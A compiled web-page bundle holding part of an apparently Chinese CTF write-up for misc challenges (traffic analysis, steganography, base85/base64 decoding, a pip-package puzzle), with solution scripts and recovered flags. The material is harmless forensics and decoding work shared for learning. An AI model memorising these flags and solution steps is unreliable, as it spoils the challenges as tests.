punctuation"}},[s._v("(")]),s._v("your_mind"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    a_girl "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"no flag"')]),s._v("\n    the_girl "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v("\nTruths "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3694")]),s._v("\nBob "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"ar"')]),s._v("\nAdi_Shamir "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"rock"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("Love")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Alice"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" Bob"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    Mallory "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("13")]),s._v("\n    Mallory "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("24")]),s._v("\nEverything "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("114514")]),s._v("\nAlice "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"you"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("Reality")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("God"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" Evil"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    God "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("26")]),s._v("\n    Evil "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("235")]),s._v("\nRon_Rivest "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"nice"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("You_Want_To")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Alice"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" Love"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" Anything"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    You "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.75428")]),s._v("\nyour_heart "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("input")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nYou "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v("\nyour_mind "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("input")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nNothing "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("31")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" Truths "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" Nothing "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" Everything"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    RSA "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Ron_Rivest "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" Adi_Shamir "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" Leonard_Adleman\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" Everything "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v(" Nothing "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" Truths"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    Problem_Makers "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Problem_Makers "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" Alice "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" Bob\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Problem_Makers"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nthe_flag "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("245")]),s._v("\nthe_confusion "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("244")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("RSA"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nMysterious_One "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"}"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Mysterious_One"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nThis "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v("\nThis "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("35")]),s._v("\nThis "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("\nThis "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("\nThis "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("\nThis "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("37")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br")])]),a("h2",{attrs:{id:"_0x24-bright-body-i"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x24-bright-body-i"}},[s._v("#")]),s._v(" 0x24 Bright Body I")]),s._v(" "),a("p",[s._v("虚幻引擎好游戏啊！（然而手残。。。。。")]),s._v(" "),a("p",[s._v("巅峰极客Nijia留下的心理阴影")]),s._v(" "),a("p",[s._v("以为要用逆向代码啥的")]),s._v(" "),a("p",[s._v("结果最后是在pak里直接strings就能出来的题目。。。。。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("strings /mnt/c/Users/Eki/Desktop/Bright\\ Body\\ I/Bright\\ Body\\ I/Magic/Content/Paks/Magic-WindowsNoEditor.pak |grep NCTF*\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"_0x25-有内鬼-终止交易"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x25-有内鬼-终止交易"}},[s._v("#")]),s._v(" 0x25 有内鬼,终止交易")]),s._v(" "),a("p",[s._v("一个ss协议流量分析题")]),s._v(" "),a("blockquote",[a("p",[s._v("一、针对wireshark最常用的自然是针对IP地址的过滤。其中有几种情况：")]),s._v(" "),a("p",[s._v("表达式为：ip.src == 192.168.0.1")]),s._v(" "),a("p",[s._v("（2）对目的地址为192.168.0.1的包的过滤，即抓取目的地址满足要求的包。")]),s._v(" "),a("p",[s._v("表达式为：ip.dst == 192.168.0.1")]),s._v(" "),a("p",[s._v("（3）对源或者目的地址为192.168.0.1的包的过滤，即抓取满足源或者目的地址的ip地址是192.168.0.1的包。")]),s._v(" "),a("p",[s._v("表达式为：ip.addr == 192.168.0.1,或者 ip.src == 192.168.0.1 or ip.dst == 192.168.0.1")]),s._v(" "),a("p",[s._v('（4）要排除以上的数据包，我们只需要将其用括号囊括，然后使用 "!" 即可。')]),s._v(" "),a("p",[s._v("表达式为：!(表达式)")]),s._v(" "),a("p",[s._v("二、针对协议的过滤")]),s._v(" "),a("p",[s._v("（1）仅仅需要捕获某种协议的数据包，表达式很简单仅仅需要把协议的名字输入即可。")]),s._v(" "),a("p",[s._v("​         表达式为：http")]),s._v(" "),a("p",[s._v("（2）需要捕获多种协议的数据包，也只需对协议进行逻辑组合即可。")]),s._v(" "),a("p",[s._v("表达式为：http or telnet （多种协议加上逻辑符号的组合即可）")]),s._v(" "),a("p",[s._v("（3）排除某种协议的数据包")]),s._v(" "),a("p",[s._v("表达式为：not arp    !tcp")]),s._v(" "),a("p",[s._v("三、针对端口的过滤（视协议而定）")]),s._v(" "),a("p",[s._v("（1）捕获某一端口的数据包")]),s._v(" "),a("p",[s._v("表达式为：tcp.port == 80")]),s._v(" "),a("p",[s._v("（2）捕获多端口的数据包，可以使用and来连接，下面是捕获高端口的表达式")]),s._v(" "),a("p",[s._v("表达式为：udp.port >= 2048")]),s._v(" "),a("p",[s._v("四、针对长度和内容的过滤")]),s._v(" "),a("p",[s._v("（1）针对长度的过虑（这里的长度指定的是数据段的长度）")]),s._v(" "),a("p",[s._v("表达式为：udp.length < 30  http.content_length <=20")]),s._v(" "),a("p",[s._v("（2）针对数据包内容的过滤")]),s._v(" "),a("p",[s._v('表达式为：http.request.uri matches "vipscu"  （匹配http请求中含有vipscu字段的请求信息）')])]),s._v(" "),a("p",[s._v("config.json泄露了加密方法、密钥和主机地址")]),s._v(" "),a("p",[s._v("用ss的源码里的脚本直接跑解密")]),s._v(" "),a("p",[s._v("人肉分析了半个下午，心态爆炸。。。。。")]),s._v(" "),a("p",[s._v("分析不出来，")]),s._v(" "),a("blockquote",[a("p",[s._v("由于客户端和服务端发送包都经过了加密，不能整个导出进行解密，需分开解密")])]),s._v(" "),a("p",[s._v("......")]),s._v(" "),a("p",[s._v("最后找到是在这个TCP包里。。。")]),s._v(" "),a("h2",{attrs:{id:"_0x26-小狗的秘密"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x26-小狗的秘密"}},[s._v("#")]),s._v(" 0x26 小狗的秘密")]),s._v(" "),a("p",[s._v("流量分析套路题")]),s._v(" "),a("p",[s._v("用Wireshark导出HTTP对象")]),s._v(" "),a("p",[s._v("最大的一个1.html里有很奇妙的东西类似")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("(255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255).....\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("盲猜是RGB像素点，把格式改一下用下面的脚本导出图像")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("#coding=utf-8\nfrom PIL import Image\n\nx = 500    #x坐标  通过对txt里的行数进行整数分\ny = 100    #y坐标  x * y = 行数\n\nim = Image.new(\"RGB\", (x, y))\nfile = open('1.html')\n\nfor i in range(0, x):\n    for j in range(0, y):\n        line = file.readline()  #获取一行的rgb值\n        rgb = line.split(\", \")  #分离rgb，文本中逗号后面有空格\n        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))\n\nim.save('flag.jpg')\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("h2",{attrs:{id:"_0x27-键盘侠"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x27-键盘侠"}},[s._v("#")]),s._v(" 0x27 键盘侠")]),s._v(" "),a("p",[s._v("下载一个zip伪加密")]),s._v(" "),a("p",[s._v("里面一张大的不科学的图")]),s._v(" "),a("p",[s._v("直接上foremost")]),s._v(" "),a("p",[s._v("得到一个docx")]),s._v(" "),a("p",[s._v("说是隐藏字符")]),s._v(" "),a("p",[s._v("打开docx隐藏字符显示")]),s._v(" "),a("p",[s._v("得到这么一串东西")]),s._v(" "),a("p",[s._v("PD4~idqQC|WjHloX>)UPb8~ZFb8laGczAeteE")]),s._v(" "),a("p",[s._v("想了很久。。")]),s._v(" "),a("p",[s._v("甚至打开xml发现密文分三段。。。还有个hint:eastAsia")]),s._v(" "),a("p",[s._v("以为是某种多表代换？")]),s._v(" "),a("p",[s._v("最后也没做出来")]),s._v(" "),a("p",[s._v("结果最后告诉我是个base85..........")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("python3\n>>> import base64\n>>> base64.b85decode('PD4~idqQC|WjHloX>)UPb8~ZFb8laGczAeteE')\nb'NCTF{Ba3e85_issssss_so_xxxxx}'\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("h2",{attrs:{id:"_0x28-what-s-this"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x28-what-s-this"}},[s._v("#")]),s._v(" 0x28 What's this")]),s._v(" "),a("p",[s._v("WireShark找到大文件点导出字节流存储为zip")]),s._v(" "),a("p",[s._v("发现还是个伪加密")]),s._v(" "),a("p",[s._v("里面一堆base64")]),s._v(" "),a("p",[s._v("多行的解不出来，应该就是base64隐写了")]),s._v(" "),a("p",[s._v("跑一下脚本就得到flag....")]),s._v(" "),a("p",[s._v("(一开始可能复制错了结果没跑出来。。。。。)")]),s._v(" "),a("h2",{attrs:{id:"_0x29-2077"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x29-2077"}},[s._v("#")]),s._v(" 0x29 2077")]),s._v(" "),a("p",[s._v("点开一看发现是2077的“官方”解密视频")]),s._v(" "),a("p",[s._v("应该会有大佬解过")]),s._v(" "),a("p",[s._v("所以Google Cyberpunk 2077 stream decode.")]),s._v(" "),a("p",[s._v("然后找到一个帖子 https://www.reddit.com/r/pcgaming/comments/9an6mn/cd_projekt_red_twitch_live_with_cyberpunk_2077/ ，解密结果是一张图")]),s._v(" "),a("p",[s._v("下载后用 sha256sum 命令求 sha256 值即可。")]),s._v(" "),a("h2",{attrs:{id:"_0x2a-pip-install"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x2a-pip-install"}},[s._v("#")]),s._v(" 0x2A pip install")]),s._v(" "),a("p",[s._v("直接把pip 下下来的包拿来分析")]),s._v(" "),a("p",[s._v("里面有一串神奇的编码。。。。")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[s._v("tmp_file "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" tempfile"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("gettempdir"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" path"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sep "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'.f14g_is_here'")]),s._v("\nf "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("tmp_file"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'w'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("write"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("close"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("用base64就能解码出来")])])}),[],!1,null,null,null);a.default=e.exports}}]);